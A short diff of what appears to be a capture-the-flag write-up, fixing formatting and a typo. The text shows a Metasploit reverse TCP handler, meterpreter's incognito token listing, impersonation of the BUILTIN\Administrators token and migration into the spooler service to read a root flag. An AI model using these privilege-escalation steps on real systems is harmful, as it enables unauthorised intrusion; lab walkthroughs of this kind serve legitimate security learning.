@@ -92,13 +92,14 @@ LPORT => 4444
 
 [*] Started reverse TCP handler on 10.23.80.154:4444 
 
+
 started TCP handler for meterpreter
 
 once in the challenge has you find a flag in the system
 
 use incognito 
 
-**list_tokens -g**
+list_tokens -g
 
 which shows the impersonate_token "BUILTIN\Administrators"  is available
 
@@ -114,4 +115,4 @@ which enables me to migrate to the spooler service and then you can just
 
 cat C:\Windows\System32\config\root.txt
 
-ooted the system PWNed
+rooted the system PWNed
